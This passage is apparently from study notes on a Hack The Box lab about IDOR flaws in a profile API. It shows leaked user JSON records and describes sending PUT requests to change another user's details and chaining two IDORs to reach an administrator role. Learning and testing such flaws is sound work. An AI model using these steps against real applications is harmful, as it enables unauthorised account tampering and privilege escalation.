We also notice that after the page loads, it fetches the user details with a `GET` request to the same API endpoint:
![](Pasted%20image%2020260723125428.png)
## Information Disclosure
![](Pasted%20image%2020260723125450.png)

```json
{ 
	"uid": "2", 
	"uuid": "4a9bd19b3b8676199592a346051f950c", 
	"role": "employee", 
	"full_name": "Iona Franklyn", 
	"email": "i_franklyn@employees.htb", 
	"about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it." 
}
```
## Modifying Other Users' Details

Now, with the user's `uuid` at hand, we can change this user's details by sending a `PUT` request to `/profile/api.php/profile/2` with the above details along with any modifications we made, as follows:
![](Pasted%20image%2020260723125535.png)

We don't get any access control error messages this time, and when we try to `GET` the user details again, we see that we did indeed update their details:
![](Pasted%20image%2020260723125555.png)
## Chaining Two IDOR Vulnerabilities

```json
{ 
	"uid": "X", 
	"uuid": "a36fa9e66e85f2dd6f5e13cad45248ae", 
	"role": "web_admin", 
	"full_name": "administrator", 
	"email": "webadmin@employees.htb", 
	"about": "HTB{FLAG}" 
}
```
![](Pasted%20image%2020260723125749.png)

```json
{ 
	"uid": "1", 
	"uuid": "40f5888b67c748df7efba008e7c2f9d2", 
	"role": "web_admin", 
	"full_name": "Amy Lindon", 
	"email": "a_lindon@employees.htb", 
	"about": "A Release is like a boat. 80% of the holes plugged is not good enough." 
}
```
![](Pasted%20image%2020260723125900.png)
![](Pasted%20image%2020260723130033.png)
